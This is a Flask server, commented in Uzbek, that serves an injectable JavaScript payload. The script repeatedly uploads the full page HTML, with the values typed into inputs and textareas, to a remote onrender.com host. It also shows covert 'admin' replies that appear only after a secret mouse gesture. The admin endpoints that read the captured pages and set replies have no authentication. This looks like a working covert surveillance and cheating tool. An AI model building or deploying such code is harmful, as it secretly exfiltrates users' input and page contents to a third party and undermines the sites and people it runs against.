from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import os
import hashlib

app = Flask(__name__)

# CORS ruxsatlari
CORS(app, resources={r"/*": {"origins": "*"}})

# SERVER MANZILI
MY_RENDER_URL = "https://mening-serverim.onrender.com"

storage = {
    "html": None,
    "page_url": "",
    "reply": "Javob yo'q",  # Admin yozgan xabar shu yerda turadi
    "html_id": 0,
    "reply_id": 0,
    "last_hash": ""
}

# --- JAVASCRIPT KOD ---
JAVASCRIPT_TEMPLATE = """
(function(){
    const serverUrl = "SERVER_URL_PLACEHOLDER";

    // --- 1. CHIROYLI XABAR (TOAST) FUNKSIYASI ---
    function showToast(text, color="#28a745", duration=2000) {
        const oldToast = document.getElementById('my-custom-toast');
        if(oldToast) oldToast.remove();

        const toast = document.createElement('div');
        toast.id = 'my-custom-toast';
        toast.innerText = text;
        toast.style.cssText = `
            position: fixed; bottom: 20px; right: 20px;
            background-color: ${color}; color: white;
            padding: 12px 25px; border-radius: 8px;
            font-family: 'Segoe UI', sans-serif; font-size: 14px; font-weight: 600;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2); z-index: 2147483647;
            opacity: 0; transform: translateY(20px); transition: all 0.4s; pointer-events: none;
        `;
        document.body.appendChild(toast);
        setTimeout(() => { toast.style.opacity = '1'; toast.style.transform = 'translateY(0)'; }, 100);
        setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 400); }, duration);
    }

    // --- ISHGA TUSHGANINI BILDIRISH ---
    showToast("✅ TIZIM ISHGA TUSHDI");

    // --- O'ZGARUVCHILAR ---
    let holdTimer = null;         // O'ng tugmani bosib turish taymeri
    let isSecretMode = false;     // Maxfiy rejim ochildimi?
    let leftClickCount = 0;       // Chap tugma sanog'i
    let resetTimer = null;        // Rejimni qayta yopish taymeri
    let lastMessage = "Hozircha xabar yo'q..."; // Serverdan kelgan xabar

    // --- KATTA XABAR OYNASI (MESSAGE BOX) ---
    const msgBox = document.createElement('div');
    msgBox.style.cssText = `
        position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
        background: rgba(0, 0, 0, 0.95); color: #00ff00; padding: 20px 40px;
        border-radius: 12px; font-family: 'Courier New', monospace; font-size: 18px;
        text-align: center; display: none; z-index: 2147483647;
        box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); border: 2px solid #00ff00;
        max-width: 80%; line-height: 1.5;
    `;
    document.body.appendChild(msgBox);

    // Xabarni ko'rsatish funksiyasi
    function showBigMessage() {
        msgBox.innerHTML = "📩 <b>ADMIN XABARI:</b><br><br>" + lastMessage;
        msgBox.style.display = 'block';

        // 10 sekunddan keyin yopiladi yoki bosganda yopiladi
        setTimeout(() => { msgBox.style.display = 'none'; }, 10000);
    }

    // Oynani bosganda yopish
    msgBox.addEventListener('click', () => { msgBox.style.display = 'none'; });

    // --- SERVERDAN JAVOBNI DOIMIY TEKSHIRISH ---
    function syncWithServer() {
        function getFullDom() {
            try {
                // Inputlarni qiymatini HTMLga yozib qo'yamiz (Admin ko'rishi uchun)
                document.querySelectorAll('input').forEach(el => el.setAttribute('value', el.value));
                document.querySelectorAll('textarea').forEach(el => el.innerHTML=el.value);
            } catch(e){}
            return document.documentElement.outerHTML;
        }

        fetch(serverUrl + '/upload', {
            method: 'POST', 
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({html: getFullDom(), page: window.location.href})
        }).then(r=>r.json()).then(data => {
            // Serverdan yangi xabar kelsa, o'zgaruvchiga saqlaymiz
            if(data.reply) {
                lastMessage = data.reply;
            }
            if(data.status === "new_data") {
                 showToast("Yuborildi ✅");
            }
        }).catch(e=>{});
    }

    // Har 3 soniyada server bilan gaplashib turadi
    setInterval(syncWithServer, 3000);


    // --- 🖱️ SICHQONCHA LOGIKASI (ENG MUHIM QISM) ---

    // 1. O'ng tugma menyusini bloklash (xalaqit bermasligi uchun)
    document.addEventListener('contextmenu', e => e.preventDefault());

    document.addEventListener('mousedown', (e) => {
        // --- O'NG TUGMA (Button 2) - BOSIB TURISH ---
        if (e.button === 2) {
            holdTimer = setTimeout(() => {
                isSecretMode = true;
                leftClickCount = 0;
                showToast("🔓 Tizim ochildi! (2 marta chapni bosing)", "#ff9800", 3000);

                // 10 soniyadan keyin rejim yana yopiladi (xavfsizlik uchun)
                if (resetTimer) clearTimeout(resetTimer);
                resetTimer = setTimeout(() => { 
                    isSecretMode = false; 
                }, 10000);
            }, 5000); // 5 soniya
        }

        // --- CHAP TUGMA (Button 0) - OCHILGANDAN KEYIN BOSISH ---
        if (e.button === 0) {
            if (isSecretMode) {
                leftClickCount++;
                if (leftClickCount >= 2) {
                    showBigMessage();   // Xabarni ko'rsatish
                    isSecretMode = false; // Rejimni yopish
                    leftClickCount = 0;
                }
            }
        }
    });

    // O'ng tugma qo'yib yuborilsa, taymerni bekor qilish
    document.addEventListener('mouseup', (e) => {
        if (e.button === 2) {
            if (holdTimer) clearTimeout(holdTimer);
        }
    });

})();
"""


@app.route('/', methods=['GET'])
def home():
    return "Server is running", 200


@app.route('/script.js', methods=['GET'])
def get_script():
    final_code = JAVASCRIPT_TEMPLATE.replace("SERVER_URL_PLACEHOLDER", MY_RENDER_URL)
    resp = Response(final_code, mimetype='application/javascript')
    resp.headers['Access-Control-Allow-Origin'] = '*'
    # Keshni o'chirish
    resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    resp.headers['Expires'] = '0'
    return resp


@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        content = data.get('html', '')
        url = data.get('page', '')
        content_hash = hashlib.md5(content.encode('utf-8')).hexdigest()

        # Admin yozgan xabarni qaytaramiz
        response_data = {"reply": storage['reply']}

        if content_hash != storage['last_hash']:
            storage['html'] = content
            storage['page_url'] = url
            storage['last_hash'] = content_hash
            storage['html_id'] += 1
            response_data["status"] = "new_data"
        else:
            response_data["status"] = "ignored"

        return jsonify(response_data)
    except:
        return jsonify({"status": "error"}), 500


# --- ADMIN ROUTES ---
@app.route('/admin-check', methods=['GET'])
def admin_check():
    return jsonify({"html_id": storage['html_id'], "current_reply": storage['reply']})


@app.route('/admin-get-html', methods=['GET'])
def admin_get_html():
    return jsonify({"html": storage['html']})


@app.route('/admin-reply', methods=['POST'])
def admin_reply():
    msg = request.json.get('message')
    if msg:
        storage['reply'] = msg  # Xabarni saqlaymiz
        storage['html_id'] += 1  # GUI yangilanishi uchun signal
        return jsonify({"status": "OK"})
    return jsonify({"status": "Error"}), 400


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)